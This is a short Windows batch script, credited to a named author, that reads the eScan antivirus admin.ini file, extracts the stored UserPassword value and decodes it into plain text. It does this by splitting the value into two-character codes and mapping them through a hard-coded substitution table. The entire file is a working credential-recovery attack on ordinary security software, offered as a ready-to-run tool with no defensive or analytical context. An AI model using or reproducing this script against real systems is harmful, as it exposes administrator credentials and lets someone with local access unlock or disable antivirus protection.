@echo off
echo Tool Developed by Mohit Tyagi @ CyberSec
echo Your Password is below :




setlocal enableextensions enabledelayedexpansion
type "C:\Program Files (x86)\eScan\admin.ini" > ipass.txt


findstr.exe /R UserPassword=.*$ ipass.txt > pass.txt
for /f "tokens=2 delims==" %%a in (pass.txt) do echo %%a>pass.txt



FOR %%? IN (pass.txt) DO ( SET /A strlength=%%~z? - 2 )

SET /A strlength=%strlength%/2
REM echo %strlength%

FOR /L %%x IN (1,1,%strlength%) DO (
  
 set /p  lin=<pass.txt
 SET "content=!lin!x"
  echo !content! > pass.txt
  
  REM type pass.txt
  
  
  
  for /f "tokens=*" %%a in (pass.txt) do (
  
  
  
  set line=%%a
  
  
  set chars=!line:~0,2!
  set leftchars=!line:~2,-1!
  echo !chars! >> passD.txt
  echo !leftchars! > pass.txt
)
  
)
del pass.txt




for /f "tokens=*" %%a in (passD.txt) do (



set ID=%%a
SET "ID=!ID:~0,-1!"


if !ID!==AK ( echo a )
if !ID!==AJ ( echo b )
if !ID!==AI ( echo c )
if !ID!==AP ( echo d )
if !ID!==AO ( echo e )
if !ID!==AN ( echo f )
if !ID!==AM ( echo g )
if !ID!==AD ( echo h )
if !ID!==AC ( echo i )
if !ID!==AB ( echo j )

if !ID!==AA ( echo k )
if !ID!==AH ( echo l )
if !ID!==AG ( echo m )
if !ID!==AF ( echo n )
if !ID!==AE ( echo o )
if !ID!==BL ( echo p )
if !ID!==BK ( echo q )
if !ID!==BJ ( echo r )
if !ID!==BI ( echo s )
if !ID!==BP ( echo t )

if !ID!==BO ( echo u )
if !ID!==BN ( echo v )
if !ID!==BM ( echo w )
if !ID!==BD ( echo x )
if !ID!==BC ( echo y )
if !ID!==BB ( echo z )

if !ID!==HK ( echo 1 )
if !ID!==HJ ( echo 2 )
if !ID!==HI ( echo 3 )
if !ID!==HP ( echo 4 )
if !ID!==HO ( echo 5 )
if !ID!==HN ( echo 6 )
if !ID!==HM ( echo 7 )
if !ID!==HD ( echo 8 )
if !ID!==HC ( echo 9 )
if !ID!==HL ( echo 0 )



if !ID!==CL ( echo ^` )
if !ID!==DF ( echo ~ )
if !ID!==GK ( echo ^^! )
if !ID!==AL ( echo @ )
if !ID!==GI ( echo # )
if !ID!==GP ( echo $ )
if !ID!==GO ( echo %% )
if !ID!==BF ( echo ^^ )
if !ID!==GN ( echo ^& )
if !ID!==GB ( echo ^* )
if !ID!==GC ( echo ^) )
if !ID!==GG ( echo - )
if !ID!==BE ( echo ^_ )
if !ID!==HG ( echo ^= )
if !ID!==GA ( echo ^+ )
if !ID!==BA ( echo [ )
if !ID!==DA ( echo { )
if !ID!==BG ( echo ] )
if !ID!==DG ( echo } )
if !ID!==BH ( echo \ )
if !ID!==DH ( echo ^| )
if !ID!==HA ( echo : )
if !ID!==HB ( echo ^; )
if !ID!==GM ( echo ^' )
if !ID!==GJ ( echo ^" )
if !ID!==GH ( echo ^, )
if !ID!==HH ( echo ^< )
if !ID!==GF ( echo . )
if !ID!==HF ( echo ^> )
if !ID!==GE ( echo / )
if !ID!==HE ( echo ? )
if !ID!==GD ( echo ^( )

)

del passD.txt
del ipass.txt







